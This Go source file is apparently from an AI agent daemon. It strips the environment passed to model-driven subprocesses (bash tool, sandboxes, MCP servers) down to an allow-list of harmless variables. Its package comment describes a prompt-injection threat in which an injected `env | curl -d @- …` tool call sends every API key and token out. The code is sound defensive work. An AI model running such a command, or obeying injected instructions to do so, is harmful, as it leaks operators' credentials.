// Package envscrub builds the environment handed to model-driven
// subprocesses: the bash tool, sandbox backends and MCP servers.
//
// The daemon's own environment carries every secret it was started
// with (provider API keys, licence key, OAuth master key, transport
// tokens). Inheriting it verbatim means a prompt-injected
// `env | curl -d @- …` exfiltrates all of them in one tool call.
// [Scrub] keeps only an allow-list of benign variables; operators add
// names through tools.bash.env_passthrough (and the MCP server's
// env_passthrough) when a subprocess genuinely needs more.
package envscrub

import (
	"sort"
	"strings"
)

// DefaultAllow is the baseline allow-list: what a shell needs to find
// binaries, locale, terminal and scratch space, and nothing that
// identifies credentials.
func DefaultAllow() []string {
	return []string{
		"PATH", "HOME", "USER", "LOGNAME", "SHELL", "TERM", "TMPDIR",
		"LANG", "LANGUAGE", "LC_ALL", "LC_CTYPE", "LC_MESSAGES", "LC_COLLATE",
		"LC_NUMERIC", "LC_TIME", "TZ", "PWD",
		"XDG_RUNTIME_DIR", "XDG_CACHE_HOME", "XDG_CONFIG_HOME", "XDG_DATA_HOME",
		"COLUMNS", "LINES", "NO_COLOR", "CI",
	}
}

// Scrub returns the subset of environ whose names are in
// DefaultAllow or extra. Order is deterministic (sorted by name) so
// process argv/env fingerprints are stable across runs. A name in
// extra may carry a trailing '*' to allow a prefix (e.g. "GIT_*").
func Scrub(environ []string, extra []string) []string {
	exact := make(map[string]bool, len(extra)+32)
	var prefixes []string
	for _, n := range DefaultAllow() {
		exact[n] = true
	}
	for _, n := range extra {
		n = strings.TrimSpace(n)
		if n == "" {
			continue
		}
		if strings.HasSuffix(n, "*") {
			prefixes = append(prefixes, strings.TrimSuffix(n, "*"))
			continue
		}
		exact[n] = true
	}
	out := make([]string, 0, len(environ))
	for _, kv := range environ {
		name, _, ok := strings.Cut(kv, "=")
		if !ok || name == "" {
			continue
		}
		if exact[name] || hasAnyPrefix(name, prefixes) {
			out = append(out, kv)
		}
	}
	sort.Strings(out)
	return out
}

func hasAnyPrefix(s string, prefixes []string) bool {
	for _, p := range prefixes {
		if p != "" && strings.HasPrefix(s, p) {
			return true
		}
	}
	return false
}
